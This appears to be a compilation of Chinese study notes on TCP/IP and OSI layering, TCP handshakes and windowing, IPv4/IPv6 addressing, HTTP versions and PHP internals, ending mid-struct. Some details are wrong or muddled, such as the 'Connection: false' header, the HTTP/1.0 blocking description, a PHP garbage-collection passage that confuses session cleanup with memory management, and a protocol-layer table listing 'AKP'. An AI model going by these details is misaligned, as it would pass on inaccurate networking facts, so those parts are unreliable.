互联网进行通信时，需要相应的网络协议，TCP/IP 原本就是为使用互联网而开发制定的协议族。

因此，互联网的协议就是 TCP/IP，TCP/IP 就是互联网的协议。

网际协议群

2. 数据包

包、帧、数据包、段、消息

以上五个术语都用来表述数据的单位，大致区分如下：

包可以说是全能性术语；

帧用于表示数据链路层中包的单位；

数据包是 IP 和 UDP 等网络层以上的分层中包的单位；

段则表示 TCP 数据流中的信息；

消息是指应用协议中数据的单位。

每个分层中，都会对所发送的数据附加一个首部，在这个首部中包含了该层必要的信息，

如发送的目标地址以及协议相关信息。通常，为协议提供的信息为包首部，所要发送的内容为数据。

在下一层的角度看，从上一层收到的包全部都被认为是本层的数据。

数据包首部

网络中传输的数据包由两部分组成：一部分是协议所要用到的首部，另一部分是上一层传过来的数据。

首部的结构由协议的具体规范详细定义。在数据包的首部，明确标明了协议应该如何读取数据。

反过来说，看到首部，也就能够了解该协议必要的信息以及所要处理的数据。包首部就像协议的脸。

3. 数据处理流程

以用户 a 向用户 b 发送邮件为例子：

数据处理流程

应用程序处理

首先应用程序会进行编码处理，这些编码相当于 OSI 的表示层功能；

编码转化后，邮件不一定马上被发送出去，这种何时建立通信连接何时发送数据的管理功能，相当于 OSI 的会话层功能。

TCP 模块的处理

TCP 根据应用的指示，负责建立连接、发送数据以及断开连接。

TCP 提供将应用层发来的数据顺利发送至对端的可靠传输。

为了实现这一功能，需要在应用层数据的前端附加一个 TCP 首部。

IP 模块的处理

IP 将 TCP 传过来的 TCP 首部和 TCP 数据合起来当做自己的数据，并在 TCP 首部的前端加上自己的 IP 首部。

IP 包生成后，参考路由控制表决定接受此 IP 包的路由或主机。

网络接口（以太网驱动）的处理

从 IP 传过来的 IP 包对于以太网来说就是数据。

给这些数据附加上以太网首部并进行发送处理，生成的以太网数据包将通过物理层传输给接收端。

网络接口（以太网驱动）的处理

主机收到以太网包后，首先从以太网包首部找到 MAC 地址判断是否为发送给自己的包，若不是则丢弃数据。

如果是发送给自己的包，则从以太网包首部中的类型确定数据类型，

再传给相应的模块，如 IP、ARP 等。这里的例子则是 IP 。

IP 模块的处理

IP 模块接收到 数据后也做类似的处理。

从包首部中判断此 IP 地址是否与自己的 IP 地址匹配，

如果匹配则根据首部的协议类型将数据发送给对应的模块，如 TCP、UDP。这里的例子则是 TCP。

另外吗，对于有路由器的情况，接收端地址往往不是自己的地址，此时，需要借助路由控制表，在调查应该送往的主机或路由器之后再进行转发数据。

TCP 模块的处理

在 TCP 模块中，首先会计算一下校验和，判断数据是否被破坏。

然后检查是否在按照序号接收数据。***检查端口号，确定具体的应用程序。

数据被完整地接收以后，会传给由端口号识别的应用程序。

应用程序的处理

接收端应用程序会直接接收发送端发送的数据。通过解析数据，展示相应的内容。

三、传输层中的 TCP 和 UDP

TCP/IP 中有两个具有代表性的传输层协议，分别是 TCP 和 UDP。

TCP 是面向连接的、可靠的流协议。流就是指不间断的数据结构，当应用程序采用 TCP 发送消息时，

虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端。

TCP 为提供可靠性传输，实行“顺序控制”或“重发控制”机制。

此外还具备“流控制（流量控制）”、“拥塞控制”、提高网络利用率等众多功能。

UDP 是不具有可靠性的数据报协议。细微的处理它会交给上层的应用去完成。

在 UDP 的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。

因此，应用有时会根据自己的需要进行重发处理。

TCP 和 UDP 的优缺点无法简单地、绝对地去做比较：TCP 用于在传输层有必要实现可靠传输的情况；

而在一方面，UDP 主要用于那些对高速传输和实时性有较高要求的通信或广播通信。

TCP 和 UDP 应该根据应用的目的按需使用。

1. 端口号

数据链路和 IP 中的地址，分别指的是 MAC 地址和 IP 地址。

前者用来识别同一链路中不同的计算机，后者用来识别 TCP/IP 网络中互连的主机和路由器。

在传输层也有这种类似于地址的概念，那就是端口号。

端口号用来识别同一台计算机中进行通信的不同应用程序。因此，它也被称为程序地址。

1.1 根据端口号识别应用

一台计算机上同时可以运行多个程序。传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序，并准确地将数据传输。

通过端口号识别应用

1.2 通过 IP 地址、端口号、协议号进行通信识别

仅凭目标端口号识别某一个通信是远远不够的。

通过端口号、IP地址、协议号进行通信识别

通信是在两台计算机上进行的。它们的目标端口号相同，都是80。这里可以根据源端口号加以区分。

目标端口号和源端口号完全相同，但它们各自的源 IP 地址不同。

此外，当 IP 地址和端口号全都一样时，我们还可以通过协议号来区分（TCP 和 UDP）。

1.3 端口号的确定

标准既定的端口号：这种方法也叫静态方法。它是指每个应用程序都有其指定的端口号。

但并不是说可以随意使用任何一个端口号。例如 HTTP、FTP、TELNET 等广为使用的应用协议中所使用的端口号就是固定的。

这些端口号被称为知名端口号，分布在 0~1023 之间；除知名端口号之外，还有一些端口号被正式注册，

它们分布在 1024~49151 之间，不过这些端口号可用于任何通信用途。

时序分配法：服务器有必要确定监听端口号，但是接受服务的客户端没必要确定端口号。

在这种方法下，客户端应用程序完全可以不用自己设置端口号，而全权交给操作系统进行分配。

动态分配的端口号范围在 49152~65535 之间。

1.4 端口号与协议

端口号由其使用的传输层协议决定。因此，不同的传输层协议可以使用相同的端口号。

此外，那些知名端口号与传输层协议并无关系。只要端口一致都将分配同一种应用程序进行处理。

2. UDP

UDP 不提供复杂的控制机制，利用 IP 提供面向无连接的通信服务。

并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。

即使是出现网络拥堵的情况，UDP 也无法进行流量控制等避免网络拥塞行为。

此外，传输途中出现丢包，UDP 也不负责重发。

甚至当包的到达顺序出现乱序时也没有纠正的功能。

如果需要以上的细节控制，不得不交由采用 UDP 的应用程序去处理。

UDP 常用于一下几个方面：

1.包总量较少的通信（DNS、SNMP等）；

2.视频、音频等多媒体通信（即时通信）；

3.限定于 LAN 等特定网络中的应用通信；4.广播通信（广播、多播）。

3. TCP

TCP 与 UDP 的区别相当大。它充分地实现了数据传输时各种控制功能，可以进行丢包时的重发控制，

还可以对次序乱掉的分包进行顺序控制。而这些在 UDP 中都没有。

此外，TCP 作为一种面向有连接的协议，只有在确认通信对端存在时才会发送数据，从而可以控制通信流量的浪费。

根据 TCP 的这些机制，在 IP 这种无连接的网络上也能够实现高可靠性的通信

（ 主要通过检验和、序列号、确认应答、重发控制、连接管理以及窗口控制等机制实现）。

3.1 三次握手（重点）

TCP 提供面向有连接的通信传输。面向有连接是指在数据通信开始之前先做好两端之间的准备工作。

所谓三次握手是指建立一个 TCP 连接时需要客户端和服务器端总共发送三个包以确认连接的建立。

在socket编程中，这一过程由客户端执行connect来触发。

三次握手

***次握手：客户端将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给服务器端，

客户端进入SYN_SENT状态，等待服务器端确认。

第二次握手：服务器端收到数据包后由标志位SYN=1知道客户端请求建立连接，

服务器端将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，

并将该数据包发送给客户端以确认连接请求，服务器端进入SYN_RCVD状态。

第三次握手：客户端收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，

ack=K+1，并将该数据包发送给服务器端，服务器端检查ack是否为K+1，ACK是否为1，

如果正确则连接建立成功，客户端和服务器端进入ESTABLISHED状态，

完成三次握手，随后客户端与服务器端之间可以开始传输数据了。

3.2 四次挥手（重点）

四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。

在socket编程中，这一过程由客户端或服务端任一方执行close来触发。

由于TCP连接是全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，

发送一个FIN来终止这一方向的连接，收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，

但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN。

首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭。

四次挥手

中断连接端可以是客户端，也可以是服务器端。

***次挥手：客户端发送一个FIN=M，用来关闭客户端到服务器端的数据传送，

客户端进入FIN_WAIT_1状态。意思是说"我客户端没有数据要发给你了"，

但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。

第二次挥手：服务器端收到FIN后，先发送ack=M+1，告诉客户端，你的请求我收到了，

但是我还没准备好，请继续你等我的消息。这个时候客户端就进入FIN_WAIT_2 状态，继续等待服务器端的FIN报文。

第三次挥手：当服务器端确定数据已发送完成，则向客户端发送FIN=N报文，告诉客户端，好了，

我这边数据发完了，准备好关闭连接了。服务器端进入LAST_ACK状态。

第四次挥手：客户端收到FIN=N报文后，就知道可以关闭连接了，但是他还是不相信网络，

怕服务器端不知道要关闭，所以发送ack=N+1后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。

服务器端收到ACK后，就知道可以断开连接了。客户端等待了2MSL后依然没有收到回复，

则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。

上面是一方主动关闭，另一方被动关闭的情况，实际中还会出现同时发起主动关闭的情况。

同时挥手

3.3 通过序列号与确认应答提高可靠性

在 TCP 中，当发送端的数据到达接收主机时，接收端主机会返回一个已收到消息的通知。

这个消息叫做确认应答（ACK）。当发送端将数据发出之后会等待对端的确认应答。

如果有确认应答，说明数据已经成功到达对端。反之，则数据丢失的可能性很大。

在一定时间内没有等待到确认应答，发送端就可以认为数据已经丢失，并进行重发。

由此，即使产生了丢包，仍然能够保证数据能够到达对端，实现可靠传输。

未收到确认应答并不意味着数据一定丢失。也有可能是数据对方已经收到，只是返回的确认应答在途中丢失。

这种情况也会导致发送端误以为数据没有到达目的地而重发数据。

此外，也有可能因为一些其他原因导致确认应答延迟到达，在源主机重发数据以后才到达的情况也屡见不鲜。

此时，源主机只要按照机制重发数据即可。

对于目标主机来说，反复收到相同的数据是不可取的。为了对上层应用提供可靠的传输，目标主机必须放弃重复的数据包。

为此我们引入了序列号。

序列号是按照顺序给发送数据的每一个字节（8位字节）都标上号码的编号。

接收端查询接收数据 TCP 首部中的序列号和数据的长度，将自己下一步应该接收的序列号作为确认应答返送回去。

通过序列号和确认应答号，TCP 能够识别是否已经接收数据，又能够判断是否需要接收，从而实现可靠传输。

序列号和确认应答

3.4 重发超时的确定

重发超时是指在重发数据之前，等待确认应答到来的那个特定时间间隔。如果超过这个时间仍未收到确认应答，

发送端将进行数据重发。最理想的是，找到一个最小时间，它能保证“确认应答一定能在这个时间内返回”。

TCP 要求不论处在何种网络环境下都要提供高性能通信，并且无论网络拥堵情况发生何种变化，

都必须保持这一特性。为此，它在每次发包时都会计算往返时间及其偏差。将这个往返时间和偏差时间相加，

重发超时的时间就是比这个总和要稍大一点的值。

在 BSD 的 Unix 以及 Windows 系统中，超时都以0.5秒为单位进行控制，因此重发超时都是0.5秒的整数倍。

不过，最初其重发超时的默认值一般设置为6秒左右。

数据被重发之后若还是收不到确认应答，则进行再次发送。此时，等待确认应答的时间将会以2倍、4倍的指数函数延长。

此外，数据也不会被***、反复地重发。达到一定重发次数之后，如果仍没有任何确认应答返回，

就会判断为网络或对端主机发生了异常，强制关闭连接。并且通知应用通信异常强行终止。

3.5 以段为单位发送数据

在建立 TCP 连接的同时，也可以确定发送数据包的单位，我们也可以称其为“***消息长度”（MSS）。

最理想的情况是，***消息长度正好是 IP 中不会被分片处理的***数据长度。

TCP 在传送大量数据时，是以 MSS 的大小将数据进行分割发送。进行重发时也是以 MSS 为单位。

MSS 在三次握手的时候，在两端主机之间被计算得出。两端的主机在发出建立连接的请求时，

会在 TCP 首部中写入 MSS 选项，告诉对方自己的接口能够适应的 MSS 的大小。然后会在两者之间选择一个较小的值投入使用。

3.6 利用窗口控制提高速度

TCP 以1个段为单位，每发送一个段进行一次确认应答的处理。这样的传输方式有一个缺点，就是包的往返时间越长通信性能就越低。

为解决这个问题，TCP 引入了窗口这个概念。确认应答不再是以每个分段，而是以更大的单位进行确认，

转发时间将会被大幅地缩短。也就是说，发送端主机，在发送了一个段以后不必要一直等待确认应答，而是继续发送。如下图所示：

窗口控制

窗口大小就是指无需等待确认应答而可以继续发送数据的***值。上图中窗口大小为4个段。

这个机制实现了使用大量的缓冲区，通过对多个段同时进行确认应答的功能。

3.7 滑动窗口控制

滑动窗口

上图中的窗口内的数据即便没有收到确认应答也可以被发送出去。不过，在整个窗口的确认应答没有到达之前，

如果其中部分数据出现丢包，那么发送端仍然要负责重传。为此，

发送端主机需要设置缓存保留这些待被重传的数据，直到收到他们的确认应答。

在滑动窗口以外的部分包括未发送的数据以及已经确认对端已收到的数据。

当数据发出后若如期收到确认应答就可以不用再进行重发，此时数据就可以从缓存区清除。

收到确认应答的情况下，将窗口滑动到确认应答中的序列号的位置。

这样可以顺序地将多个段同时发送提高通信性能。这种机制也别称为滑动窗口控制。

3.8 窗口控制中的重发控制

在使用窗口控制中， 出现丢包一般分为两种情况：

确认应答未能返回的情况。在这种情况下，数据已经到达对端，是不需要再进行重发的，如下图：

部分确认应答丢失

② 某个报文段丢失的情况。接收主机如果收到一个自己应该接收的序列号以外的数据时，

会针对当前为止收到数据返回确认应答。如下图所示，当某一报文段丢失后，

发送端会一直收到序号为1001的确认应答，因此，在窗口比较大，又出现报文段丢失的情况下，

同一个序列号的确认应答将会被重复不断地返回。而发送端主机如果连续3次收到同一个确认应答，

就会将其对应的数据进行重发。这种机制比之前提到的超时管理更加高效，因此也被称为高速重发控制。

高速重发控制

四、网络层中的 IP 协议

IP（IPv4、IPv6）相当于 OSI 参考模型中的第3层——网络层。网络层的主要作用是“实现终端节点之间的通信”。

这种终端节点之间的通信也叫“点对点通信”。

网络的下一层——数据链路层的主要作用是在互连同一种数据链路的节点之间进行包传递。

而一旦跨越多种数据链路，就需要借助网络层。网络层可以跨越不同的数据链路，

即使是在不同的数据链路上也能实现两端节点之间的数据包传输。

IP 大致分为三大作用模块，它们是 IP 寻址、路由（最终节点为止的转发）以及 IP 分包与组包。

1. IP 地址

1.1 IP 地址概述

在计算机通信中，为了识别通信对端，必须要有一个类似于地址的识别码进行标识。

在数据链路中的 MAC 地址正是用来标识同一个链路中不同计算机的一种识别码。

作为网络层的 IP ,也有这种地址信息，一般叫做 IP 地址。

IP 地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址”。

因此，在 TCP/IP 通信中所有主机或路由器必须设定自己的 IP 地址。

不论一台主机与哪种数据链路连接，其 IP 地址的形式都保持不变。

IP 地址（IPv4 地址）由32位正整数来表示。IP 地址在计算机内部以二进制方式被处理。

然而，由于我们并不习惯于采用二进制方式，我们将32位的 IP 地址以每8位为一组，

分成4组，每组以 “.” 隔开，再将每组数转换成十进制数。如下：

1.2 IP 地址由网络和主机两部分标识组成

如下图，网络标识在数据链路的每个段配置不同的值。网络标识必须保证相互连接的每个段的地址不相重复。

而相同段内相连的主机必须有相同的网络地址。IP 地址的“主机标识”则不允许在同一个网段内重复出现。

由此，可以通过设置网络地址和主机地址，在相互连接的整个网络中保证每台主机的 IP 地址都不会相互重叠。即 IP 地址具有了唯一性。

IP地址的主机标识

如下图，IP 包被转发到途中某个路由器时，正是利用目标 IP 地址的网络标识进行路由。

因为即使不看主机标识，只要一见到网络标识就能判断出是否为该网段内的主机。

IP地址的网络标识

1.3 IP 地址的分类

IP 地址分为四个级别，分别为A类、B类、C类、D类。它根据 IP 地址中从第 1 位到第 4 位的比特列对其网络标识和主机标识进行区分。

A 类 IP 地址是首位以 “0” 开头的地址。从第 1 位到第 8 位是它的网络标识。

用十进制表示的话，0.0.0.0~127.0.0.0 是 A 类的网络地址。A 类地址的后 24 位相当于主机标识。

因此，一个网段内可容纳的主机地址上限为16,777,214个。

B 类 IP 地址是前两位 “10” 的地址。从第 1 位到第 16 位是它的网络标识。

用十进制表示的话，128.0.0.0~191.255.0.0 是 B 类的网络地址。B 类地址的后 16 位相当于主机标识。

因此，一个网段内可容纳的主机地址上限为65,534个。

C 类 IP 地址是前三位为 “110” 的地址。从第 1 位到第 24 位是它的网络标识。

用十进制表示的话，192.0.0.0~223.255.255.0 是 C 类的网络地址。C 类地址的后 8 位相当于主机标识。

因此，一个网段内可容纳的主机地址上限为254个。

D 类 IP 地址是前四位为 “1110” 的地址。从第 1 位到第 32 位是它的网络标识。

用十进制表示的话，224.0.0.0~239.255.255.255 是 D 类的网络地址。D 类地址没有主机标识，常用于多播。

在分配 IP 地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时，不可以全部为 0 或全部为 1。

因为全部为 0 只有在表示对应的网络地址或 IP 地址不可以获知的情况下才使用。

而全部为 1 的主机通常作为广播地址。因此，在分配过程中，应该去掉这两种情况。

这也是为什么 C 类地址每个网段最多只能有 254（ 28 - 2 = 254）个主机地址的原因。

1.4 广播地址

广播地址用于在同一个链路中相互连接的主机之间发送数据包。将 IP 地址中的主机地址部分全部设置为 1，就成了广播地址。

广播分为本地广播和直接广播两种。在本网络内的广播叫做本地广播；在不同网络之间的广播叫做直接广播。

1.5 IP 多播

多播用于将包发送给特定组内的所有主机。由于其直接使用 IP 地址，因此也不存在可靠传输。

相比于广播，多播既可以穿透路由器，又可以实现只给那些必要的组发送数据包。请看下图：

IP 多播

多播使用 D 类地址。因此，如果从首位开始到第 4 位是 “1110”，就可以认为是多播地址。而剩下的 28 位可以成为多播的组编号。

此外， 对于多播，所有的主机（路由器以外的主机和终端主机）必须属于 224.0.0.1 的组，所有的路由器必须属于 224.0.0.2 的组。

1.6 子网掩码

现在一个 IP 地址的网络标识和主机标识已不再受限于该地址的类别，

而是由一个叫做“子网掩码”的识别码通过子网网络地址细分出比 A 类、B 类、C 类更小粒度的网络。

这种方式实际上就是将原来 A 类、B 类、C 类等分类中的主机地址部分用作子网地址，

可以将原网络分为多个物理网络的一种机制。

子网掩码用二进制方式表示的话，也是一个 32 位的数字。它对应 IP 地址网络标识部分的位全部为 “1”，

对应 IP 地址主机标识的部分则全部为 “0”。由此，一个 IP 地址可以不再受限于自己的类别，

而是可以用这样的子网掩码自由地定位自己的网络标识长度。当然，子网掩码必须是 IP 地址的首位开始连续的 “1”。

对于子网掩码，目前有两种表示方式。***种是，将 IP 地址与子网掩码的地址分别用两行来表示。

以 172.20.100.52 的前 26 位是网络地址的情况为例，如下：

第二种表示方式是，在每个 IP 地址后面追加网络地址的位数用 “/ ” 隔开，如下：

2. 路由

发送数据包时所使用的地址是网络层的地址，即 IP 地址。然而仅仅有 IP 地址还不足以实现将数据包发送到对端目标地址，

在数据发送过程中还需要类似于“指明路由器或主机”的信息，以便真正发往目标地址。保存这种信息的就是路由控制表。

该路由控制表的形成方式有两种：一种是管理员手动设置，另一种是路由器与其他路由器相互交换信息时自动刷新。

前者也叫做静态路由控制，而后者叫做动态路由控制。

IP 协议始终认为路由表是正确的。然后，IP 本身并没有定义制作路由控制表的协议。

即 IP 没有制作路由控制表的机制。该表示由一个叫做“路由协议”的协议制作而成。

2.1 IP 地址与路由控制

IP 地址的网络地址部分用于进行路由控制。

路由控制表中记录着网络地址与下一步应该发送至路由器的地址。

在发送 IP 包时，首先要确定 IP 包首部中的目标地址，再从路由控制表中找到与该地址具有相同网络地址的记录，

根据该记录将 IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录，就选择一个最为吻合的网络地址。

路由控制表与 IP 包发送

3. IP 分包与组包

每种数据链路的***传输单元（MTU）都不尽相同，因为每个不同类型的数据链路的使用目的不同。使用目的不同，可承载的 MTU 也就不同。

任何一台主机都有必要对 IP 分片进行相应的处理。分片往往在网络上遇到比较大的报文无法一下子发送出去时才会进行处理。

经过分片之后的 IP 数据报在被重组的时候，只能由目标主机进行。路由器虽然做分片但不会进行重组。

3.1 路径 MTU 发现

分片机制也有它的不足。如路由器的处理负荷加重之类。因此，只要允许，是不希望由路由器进行 IP 数据包的分片处理的。

为了应对分片机制的不足，“路径 MTU 发现” 技术应运而生。路径 MTU 指的是，

发送端主机到接收端主机之间不需要分片是*** MTU 的大小。即路径中存在的所有数据链路中最小的 MTU 。

进行路径 MTU 发现，就可以避免在中途的路由器上进行分片处理，也可以在 TCP 中发送更大的包。

4. IPv6

IPv6（IP version 6）是为了根本解决 IPv4 地址耗尽的问题而被标准化的网际协议。

IPv4 的地址长度为 4 个 8 位字节，即 32 比特。而 IPv6 的地址长度则是原来的 4 倍，即 128 比特，一般写成 8 个 16 位字节。

4.1 IPv6 的特点

IP 得知的扩大与路由控制表的聚合。

性能提升。包首部长度采用固定的值（40字节），不再采用首部检验码。简化首部结构，减轻路由器负担。路由器不再做分片处理。

支持即插即用功能。即使没有DHCP服务器也可以实现自动分配 IP 地址。

采用认证与加密功能。应对伪造 IP 地址的网络安全功能以及防止线路窃听的功能。

多播、Mobile IP 成为扩展功能。

4.2 IPv6 中 IP 地址的标记方法

一般人们将 128 比特 IP 地址以每 16 比特为一组，每组用冒号（“：”）隔开进行标记。

而且如果出现连续的 0 时还可以将这些 0 省略，并用两个冒号（“：：”）隔开。但是，一个 IP 地址中只允许出现一次两个连续的冒号。

4.3 IPv6 地址的结构

IPv6 类似 IPv4，也是通过 IP 地址的前几位标识 IP 地址的种类。

在互联网通信中，使用一种全局的单播地址。它是互联网中唯一的一个地址，不需要正式分配 IP 地址。

4.4 全局单播地址

全局单播地址是指世界上唯一的一个地址。它是互联网通信以及各个域内部通信中最为常用的一个 IPv6 地址。

格式如下图所示，现在 IPv6 的网络中所使用的格式为，n = 48，m = 16 

以及 128 - n - m = 64。即前 64 比特为网络标识，后 64 比特为主机标识。

全局单播地址

4.5 链路本地单播地址

链路本地单播地址是指在同一个数据链路内唯一的地址。它用于不经过路由器，

在同一个链路中的通信。通常接口 ID 保存 64 比特版的 MAC 地址。

链路本地单播地址

4.6 唯一本地地址

唯一本地地址是不进行互联网通信时所用的地址。

唯一本地地址虽然不会与互联网连接，但是也会尽可能地随机生成一个唯一的全局 ID。

L 通常被置为 1

全局 ID 的值随机决定

子网 ID 是指该域子网地址

接口 ID 即为接口的 ID

唯一本地地址

4.7 IPv6 分段处理

IPv6 的分片处理只在作为起点的发送端主机上进行，路由器不参与分片。

IPv6 中最小 MTU 为 1280 字节，因此，在嵌入式系统中对于那些有一定系统资源限制的设备来说，

不需要进行“路径 MTU 发现”，而是在发送 IP 包时直接以 1280 字节为单位分片送出。

4.8 IP 首部（暂略）

5. IP 协议相关技术

IP 旨在让最终目标主机收到数据包，但是在这一过程中仅仅有 IP 是无法实现通信的。

必须还有能够解析主机名称和 MAC 地址的功能，以及数据包在发送过程中异常情况处理的功能。

5.1 DNS

我们平常在访问某个网站时不适用 IP 地址，而是用一串由罗马字和点号组成的字符串。

而一般用户在使用 TCP/IP 进行通信时也不使用 IP 地址。

能够这样做是因为有了 DNS （Domain Name System）功能的支持。

DNS 可以将那串字符串自动转换为具体的 IP 地址。

这种 DNS 不仅适用于 IPv4，还适用于 IPv6。

5.2 ARP

只要确定了 IP 地址，就可以向这个目标地址发送 IP 数据报。然而，在底层数据链路层，

进行实际通信时却有必要了解每个 IP 地址所对应的 MAC 地址。

ARP 是一种解决地址问题的协议。以目标 IP 地址为线索，

用来定位下一个应该接收数据分包的网络设备对应的 MAC 地址。

不过 ARP 只适用于 IPv4，不能用于 IPv6。IPv6 中可以用 ICMPv6 替代 ARP 发送邻居探索消息。

RARP 是将 ARP 反过来，从 MAC 地址定位 IP 地址的一种协议。

5.3 ICMP

ICMP 的主要功能包括，确认 IP 包是否成功送达目标地址，通知在发送过程当中 IP 包被废弃的具体原因，改善网络设置等。

IPv4 中 ICMP 仅作为一个辅助作用支持 IPv4。也就是说，在 IPv4 时期，即使没有 ICMP，

仍然可以实现 IP 通信。然而，在 IPv6 中，ICMP 的作用被扩大，如果没有 ICMPv6，IPv6 就无法进行正常通信。

5.4 DHCP

如果逐一为每一台主机设置 IP 地址会是非常繁琐的事情。特别是在移动使用笔记本电脑、

只能终端以及平板电脑等设备时，每移动到一个新的地方，都要重新设置 IP 地址。

于是，为了实现自动设置 IP 地址、统一管理 IP 地址分配，

就产生了 DHCP（Dynamic Host Configuration Protocol）协议。有了 DHCP，计算机只要连接到网络，

就可以进行 TCP/IP 通信。也就是说，DHCP 让即插即用变得可能。

DHCP 不仅在 IPv4 中，在 IPv6 中也可以使用。

5.5 NAT

NAT（Network Address Translator）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。

除转换 IP 地址外，还出现了可以转换 TCP、UDP 端口号的 NAPT（Network Address Ports Translator）技术，

由此可以实现用一个全局 IP 地址与多个主机的通信。

NAT（NAPT）实际上是为正在面临地址枯竭的 IPv4 而开发的技术。不过，在 IPv6 中为了提高网络安全也在使用 NAT，

在 IPv4 和 IPv6 之间的相互通信当中常常使用 NAT-PT。

5.6 IP 隧道

夹着 IPv4 网络的两个 IPv6 网络

如上图的网络环境中，网络 A 与网络 B 之间无法直接进行通信，为了让它们之间正常通信，这时必须得采用 IP 隧道的功能。

IP 隧道可以将那些从网络 A 发过来的 IPv6 的包统合为一个数据，再为之追加一个 IPv4 的首部以后转发给网络 C。

一般情况下，紧接着 IP 首部的是 TCP 或 UDP 的首部。然而，现在的应用当中“ IP 首部的后面还是 IP 首部

”或者“ IP 首部的后面是 IPv6 的首部”等情况与日俱增。这种在网络层的首部后面追加网络层首部的通信方法就叫做“ IP 隧道”。

### 四层模型及OSI七层参考模型

https://blog.csdn.net/guoguo527/article/details/52078962

1. OSI七层和TCP/IP四层的关系

1.1 OSI引入了服务、接口、协议、分层的概念，TCP/IP借鉴了OSI的这些概念建立TCP/IP模型。

1.2 OSI先有模型，后有协议，先有标准，后进行实践；而TCP/IP则相反，先有协议和应用再提出了模型，且是参照的OSI模型。

1.3 OSI是一种理论下的模型，而TCP/IP已被广泛使用，成为网络互联事实上的标准。

TCP：transmission control protocol 传输控制协议

UDP：user data protocol 用户数据报协议

OSI七层网络模型

TCP/IP四层概念模型  

对应网络协议

应用层（Application）

应用层

HTTP、TFTP, FTP, NFS, WAIS、SMTP

表示层（Presentation）

Telnet, Rlogin, SNMP, Gopher

会话层（Session）

SMTP, DNS

传输层（Transport）

传输层

TCP, UDP

网络层（Network）

网络层

IP, ICMP, ARP, RARP, AKP, UUCP

数据链路层（Data Link）

数据链路层

FDDI, Ethernet, Arpanet, PDN, SLIP, PPP

物理层（Physical）

IEEE 802.1A, IEEE 802.2到IEEE 802.11

2. OSI七层协议模型

七层结构记忆方法：应、表、会、传、网、数、物

应用层协议需要掌握的是：HTTP（Hyper text transfer protocol）、FTP（file transfer protocol）、SMTP（simple mail transfer rotocol）、POP3（post office protocol 3）、IMAP4（Internet mail access protocol）

3. TCP/IP四层模型

3.1 应用层：对应OSI中的应用层、表示层、会话层

3.2 物理链路层：对应OSI中的数据链路层、物理层（也有叫网络接口层）

3.3 数据包说明：
IP层传输单位是IP分组，属于点到点的传输；TCP层传输单位是TCP段，属于端到端的传输

### 三次握手四次挥手
```
简略快速回忆版：
- 三次握手
客户端：我要和你通信(syn-sent)
服务端：你的请求已收到，发送确认(syn-rcvd)
客户端：你的确认已收到，连接建立(est)

- 四次挥手
客户端：我没有东西了，准备关闭(fin-wait)
服务端：你的关闭我收到了，但我还有点东西没传完(close-wait)
……一段时间后……
服务端：我的东西传完了，可以关闭了(last-ack)
客户端：收到关闭通知，你也可以关闭了(time-wait)
```

### http版本
1.0
无状态、无连接。
HTTP1.0规定浏览器和服务器保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，
服务器处理完成后立即断开TCP连接（无连接），服务器不跟踪每个客户端也不记录过去的请求（无状态）。

队头阻塞
HTTP1.0规定下一个请求必须在前一个请求响应到达之前才能发送。
假设前一个请求响应一直不到达，那么下一个请求就不发送，同样的后面的请求也给阻塞了。

1.1
长连接
HTTP1.1增加了一个Connection字段，通过设置Keep-Alive可以保持HTTP连接不断开，
避免了每次客户端与服务器请求都要重复建立释放建立TCP连接，提高了网络的利用率。
如果客户端想关闭HTTP连接，可以在请求头中携带Connection: false来告知服务器关闭请求。

管道化
基于HTTP1.1的长连接，使得请求管线化成为可能。管线化使得请求能够“并行”传输。

新的字段
如cache-control，支持断点传输，以及增加了Host字段（使得一个服务器能够用来创建多个Web站点）。

2.0
二进制分帧
HTTP2.0通过在应用层和传输层之间增加一个二进制分帧层，突破了HTTP1.1的性能限制、改进传输性能。

多路复用（连接共享）
HTTP2.0实现了真正的并行传输，它能够在一个TCP上进行任意数量HTTP请求。而这个强大的功能则是基于“二进制分帧”的特性。

头部压缩
HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，
既避免了重复header的传输，又减小了需要传输的大小。
高效的压缩算法可以很大的压缩header，减少发送包的数量从而降低延迟。

服务器推送
服务器除了对最初请求的响应外，服务器还可以额外的向客户端推送资源，而无需客户端明确的请求。

### PHP 的垃圾收集机制是怎样的
php作为脚本语言是页面结束即释放变量所占内存的。 

当一个 PHP线程结束时，当前占用的所有内存空间都会被销毁， 当前程序中所有对象同时被销毁。GC进程一般都跟着每起一个SESSION而开始运行的.

gc目的是为了在session文件过期以后自动销毁删除这些文件.

在PHP中，没有任何变量指向这个对象时，这个对象就成为垃圾。

PHP会将其在内存中销毁；这是PHP的GC垃圾处理机制，防止内存溢出。

执行这些函数也可以起到回收作用__destruct /unset/mysql_close /fclose php 对session有明确的gc处理时间设定session.gc_maxlifetime 如果说有垃圾， 那就是整体的程序在框架使用中，会多次调用同一文件等等造成的非单件模式等。

所以在出来的时候，必要的用_once引用，在声明类的时候使用单件模式。还有简化逻辑等等。

### 深入理解PHP7内核之zval

https://www.laruence.com/2018/04/08/3170.html

在PHP5的时候, zval的定义如下:
```
struct _zval_struct {
     union {
          long lval;
          double dval;
          struct {
               char *val;
               int len;
          } str;
          HashTable *ht;
          zend_object_value obj;
          zend_ast *ast;
     } value;
     zend_uint refcount__gc;
     zend_uchar type;
